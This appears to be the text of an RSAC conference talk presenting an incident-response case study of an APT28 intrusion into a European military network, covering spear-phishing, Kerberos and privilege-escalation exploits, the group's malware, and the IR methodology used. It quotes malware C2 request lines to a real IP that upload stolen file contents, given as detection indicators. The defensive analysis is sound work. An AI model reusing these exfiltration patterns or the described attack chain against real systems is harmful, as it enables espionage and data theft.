Agenda

#RSAC

What we discuss today
 Today I would introduce a case I am still working on.
 The case is related to Military Sector, and it has been recorded with minimal

differences in several EU military environments.
 The details of the attack are under strict NDA, but with slight modifications I have

the chance to share the most important details about the attacker strategies, tactics
and tools used.
 The case is interesting for several reasons that we will discuss today.
 The triage is still going on.

The adversary
APT28
 The attack has been attributed to APT Group 28, also known as “Sofacy” or

“Sednit”. I will call it “APT28” from now on.
 APT28 group believed to have been in operation since 2007 and has been

identified in several attacks that have targeted Eastern European governments,
military and security-related organizations including the North Atlantic Treaty
Organization (NATO).
 The group uses a complex set of tools and strategies to put a foothold in an

environment and to control and steal interesting data.
 Several sources consider APT28 a group of CyberMercs based in Russia.

#RSAC

The target: the moat without water
How to develop a good network segmentation and be breached
 The attack has targeted a military environment in EMEA region.
 The environment has born segmented, with several layer of controls to preserve

confidentiality and integrity of exchanged and stored data.
 The segmentation separates the network in several layers with different level of

“trust”.
 Any operator receives a badge and a smartcard to operate in the network.
 Communication from a lower to an higher layer of trust is blocked, instead

communication from higher layer to a lower one are permitted.
 At the beginning of the investigation I discovered that the base lacks any real

network visibility. The only network devices capable of analyzing streams were
sporadic IDS and IPS placed in non strategic points.

#RSAC

The target: the moat without water
How to develop a good network segmentation and be breached
 The environment is a Microsoft AD Forest with a pyramidal structure.

• The root AD trusts several subdomains each with
its proper set of AD servers.
• The forest is regulated with different level of trust.
• The «Secret» and «NATO» networks are physically
separated entities were people can access only
through dedicated machines.
• Under no circumstances a user from standard AD
structure can access Secret networks.

#RSAC

The target: the moat without water

#RSAC

How to develop a good network segmentation and be breached
 Patching policies are 15 days behind Microsoft releases.
 All other applications are patched and upgraded based on internal CERT approval.
 The reason for the delay is due to the need to verify the consistency and the impact

of upgrade/patch against production environment.
 During the investigation we have discovered that, in the Data Center, two AD

servers related to trusted subdomains, were not properly patched since November
2014 due to the swap from a maintenance contractor to another.
 The lack of the patch MS14-068 is a key to understand how deep and how hard

they have been breached.

The Attack

#RSAC

The attack strategy

#RSAC

How they break-in
 The attack started from a targeted spear-phish campaign against the participants of

the 2014 Farnborough Air Show.
 The attack has targeted 7 officials of Air Force (AM) and 2 official of the Navy (MM)

the email domain source was: “militaryexponews[.]com”
 The attack exploit a Microsoft Word vulnerability (CVE-2015-2424).
 Only in two cases the attack completes successfully for the attacker.
 In seven cases, the exploit, despite successfully detonated, was not able to start the

infection because the machines lack direct Internet access (proxy blocked
connection attempts).
 The reconstruction of the first stage has been performed after the creation of a

proper set of IOCs starting from the infected systems.

The attack strategy

#RSAC

More patients to care about…
 To escalate the infection the attacker have used the OWA access of the stolen

accounts to enumerate other potential victims for a new wave of targeted emails.
 Also, one of the officers has access to internal Sharepoint service and participates

to boards were specific internal meetings and projects are discussed.
 With tailored messages published in Sharepoint board, the attacker has been able

to sneak through the inner layers of the military infrastructure distributing the
dropper.

 One lesson I learn from Sharepoint…

it has a horrible Log format.

The infection evolution
 In this second wave of attack the adversary, knowing that the previous phase has

not succeeded as planned due to access restriction with proxy and firewalls, has
modified the dropper in order to work with internal proxy (with HTTP and SSL).
 The modification has insured the control of all successfully infected hosts.

The attack strategy

#RSAC

The infection progression
 The attacker has now a significant set of standard Domain Users account.
 Not enough to pawn the infrastructure, but good enough as a starting point.
 Thanks to his backdoor, he can easily begin to extend his action to other systems.
 Lacking logs and network visibility, for that part, we can only speculate that he

successfully identifies the vulnerable Navy subdomains by accessing Navy computers
in the base.
 The victims have direct access to the abovementioned AD servers because they use

them for standard authentication.
 APT28 at this point has breached AD servers, has collected domain admins

credentials and has moved forward to the Root AD and the repositories where
“interesting data” resides.

CVE 2014-6324

#RSAC

LOG IOC
 Windows Audit log showing the successful exploitation of the Kerberos Service.

• When looking at the Audit log, to
understand the successful exploit we
should compare the Security ID with
the Account Name.
These two should be identical.
• In this case, slightly modified from the
original log, we can see the «Officer
A» logging with the Security ID of
«Administrator».

Pwning the core: CVE-2015-1701

#RSAC

AKA… «How to pwn your AD and live undetected»…
 The attacker has been able to exploit root AD Servers thanks to a unknown (initially)

local privilege escalation vulnerability CVE-2015-1701.
The attacker has
exploited a callback in
UserSpace.
Upon completion, the
payload continues
execution in UserMode
with the privileges of
the System process.

Note: The technique has been reported by Microsoft thanks to the
analyses carried out in this engagement…

The Incident

Patient Zero

#RSAC

How the victim discovers the problem
 The diplomatic representation in Addis Ababa is composed of few militaries and

several diplomats connected to Internet with the standard VPN service from public
networks (transit through the Base). For that part, nobody has noticed the strange
connections to the external C2s repeated each day.
 But for a specific task, the owner of the infected laptop has used a connection from

a military outpost, tightly regulated in access time and permissions.
 Once connected, the computer has attempted to beacon to the C2s and the local

network operator has identified the strange traffic signaling it to his superiors.
 The alert has escalated to the Army regiment which has started to investigate.
 The analysis performed has followed the traditional practice.

Patient Zero

#RSAC

How the attacker reacted
 The Army has triaged the compromised system reinstalling the OS and applications

and has close the case.
 As result of the triage, the attacker changes strategy for a while.
 APT28 has lowered the volume of his traffic and, for more than 20 days nothing

has been reported.
 The military was ready closed the case, but another anomaly has been founded

during a scheduled maintenance on a server in the base Data Center.
 Looking at the logs, they have discovered the presence of repeated accesses from

ad Administrator account logging from an external IP address.
 The case has escalated quickly this time.

#RSAC

The Methodology

What we can bring to the table?


I am part of RSA IR Team and our structured approach, developed from our
field experience is now tuned to face attacks like this one.



Our approach leverages on “Actionable IoCs” and the support of tools that
could easily integrate these IoCs to speedup the IR investigation process.



This is a methodology and not a “method”, because it counts on procedures,
analyses and evidences in a scientifically sounding approach.



To collect actionable IoCs we use a synergic approach that includes network
and system visibility with log and malware analyses.



It involves aggregation of IoCs and their classification to create a “Knowledge
Base” of attacks, tools and strategies that could be “reused” in subsequent
engagements to streamline the response and support the attribution.

#RSAC

What our methodology suggests
 To operationalize the IoC you should develop, use and store it in a reusable logic.

#RSAC

Investigation: first step


The Customer has initially escalated the problem to another team, but despite
the efforts and a triage attempt, the result was not satisfactory.



Few days after the triage they discover additional lateral movements in their
network.



At this point the Customer called us.



We notice, since the initial talk, that the Customer was lacking any network
visibility and the investigation was performed without a structured approach.
No network visibility
No detailed analysis has
been performed initially

Limited quantity of
historical logs

The initial investigation has
been limited to MD5 search
on Domain machines.

Zero Trust

#RSAC

Below zero trust…
 Following our advice to bring a network forensic tool in their environment (RSA

Security Analytics) we have been able to ensure that, even after the «apparent»
expulsion of the attacker, several machines were still infected.

Successful
communication
recorded after
expulsion/triage…

The «network

offered also
the chance to
proactively
monitor the
occurrence of
other malicious
attacks.

Our investigation

#RSAC

Our approach tailored to the case


We have rebuilt the investigation process from the scratch aiming to identify malicious
behavior from the already collected samples to build optimal Network Forensic IOC and to
apply them as a base to highlight further machines infected.
Integrated a Network
Forensic Tool: RSA SA

Redefined Actionable
IOCs at Network, System
and Log level for different
platforms and systems.

Refocused the malware
analysis on all identified
samples to identify
Actionable IOCs.

Improved the triage
strategy by moving from
°seek & destroy° to a
more strategic approach.

 Thanks to that we have been able to enumerate remaining infected machines and to unearth
the “missing piece”: the Chopstick RAT that the original IR team was not capable of identify.
We know, from experience, that APT28 uses Chopstick RAT for most interesting targets.

#RSAC

Attacker Tools

APT 28 Tools
APT 28 Tools seen in this investigation
 CORESHELL: This downloader is the evolution of the previous downloader of

choice from APT28 known as “SOURFACE” (or “Sofacy”). This downloader, once
executed, create the conditions to download and execute a second-stage
(usually Eviltoss) from a C2.

 EVILTOSS: This backdoor is delivered through CORESHELL downloader to gain

system access for reconnaissance, monitoring, credential theft, and shellcode
execution.

 CHOPSTICK: This is a modular implant compiled from a software framework that

provides tailored functionality and flexibility. By far Chopstick is the most
advanced tool used by APT 28.

 MIMIKATZ: Everyone of us knows this tool. In this case, this has been of

devastating effects to completely compromise AD Forest.

#RSAC

APT 28 Tools
CORESHELL behavioral analysis

Coreshell was relatively easy to detonate, apart for some AntiVM checks before executing.
The behavioral analysis has permitted to highlight several DNS connections:

The DNS requests aim to different external hosts.
The malware use a beacon mechanism based on
HTTP POST and a separate thread for
instructions still in HTTP.
The User-Agent, as explained earlier, can be used
as IOC, at least for the oldest variants.
Note: Latest version of CORESHELL uses the victim’s browser User-Agent
making the IOC useless.

CORESHELL ATTRIBUTION BY COMPARISON

The attribution has been
performed in two ways:
 by comparison, between the
discovered samples and the
public ones.
 by analysis, looking for
indicators related to the date
and time of compilation, the
time zone, the language of
the malware and its
behaviour.
The dropped files have been verified
as well and compared between
different droppers.

APT 28 Tools

#RSAC

EVILTOSS IOCs
 EVILTOSS and CORESHELL share a lot of commonalities, both in the

communication mechanism and the obfuscation/encryption. I.E. both obfuscate
strings that are decoded at runtime.
 EVILTOSS uses RSA encryption to encrypt data and send it through a HTTP

POST message very similar to CORESHELL traffic:

CHOPSTICK
 CHOPSTICK is a Trojan family, written in C++ and built from a framework.
 It offers a diverse set of capabilities for different deployments.
 It collects detailed information from the host settings and it is aware of the presence

of several security products.
 It may communicate with external servers using SMTP, HTTP or HTTPs.
 CHOPSTICK stores all collected information in a hidden file for temporary storage.
 It communicates with the C2 via Windows “mailslot”, not named pipes or sockets.
 CHOPSTICK main executable creates a “mailslot” in Windows machines and acts as

the mailslot server, while its code injected into the other processes acts as a client
allowing the Trojan to access and steal any type of information.
 The RC4 encryption used here also uses a 50 bytes static key plus four-byte random

salt value.

APT 28 Tools
CHOPSTICK IOCs
 Looking at network traffic we discover that, after approximately 60 seconds of

execution time, CHOPSTICK begins communicating with one of its C2 servers.
Usually as in our sample the traffic was over HTTP:
GET /find/?itwm=90QDFR9CWZckwkTPHr2GOUXPXI91A&from=yVVgOqV1UG&utm=HTXh&utm=9kV7L3Z&oprnd=Xjp1kKrDgAeFu&from=06&9u2J=nYruvlhMtXN5

Host: 198.105.125.74

 After sending an initial HTTP GET request it uploads the file contents of

edg6EF885E2.tmp to the C2 server using HTTP POST requests.
POST /open/?ags=bBz&ags=qVs5d0kGHtil&oprnd=6ZCuc7XQ&channel=gBDFmj_fJdNk9&itwm=HJxam7mDOyIBftJ6OwEQjGBzyjpQv HTTP/1.1

Conclusion

#RSAC

What I can suggest
 It is extremely valuable to build an internal Knowledge base about incidents and

attacks recorded and published and to extract IOCs from these incidents.
 It is extremely useful to refocus the IR procedures dividing them in four areas:





Network Forensic
System Forensic
Log Analysis
Malware Analysis

Actionable IOCs

Rapid Incident reaction
Proactive Management

 It could be extremely important to streamline the IR procedures by transforming IOCs

to actionable IOCs, that means to evaluate and define which IOC can be reused and
which one is limited to a specific attack or event.
 It is important to drill and to give IR personnel the chance to learn how to build, use,

extract, evaluate and properly store Actionable IOCs.

Conclusion

#RSAC

What our methodology suggests

You should not approach IR
operations in a unstructured
way.

You should ensure proper
«visibility» to all IR fields.

You should avoid to manage
the Incident through «work
arounds» and «shortcuts»

You should avoid to rely only
on technologies

You should keep your IR
capabilities updated

Once formalized, you should
use IoCs as key element to
evaluate the attack surface

You should organize the
triage in a strategic approach.
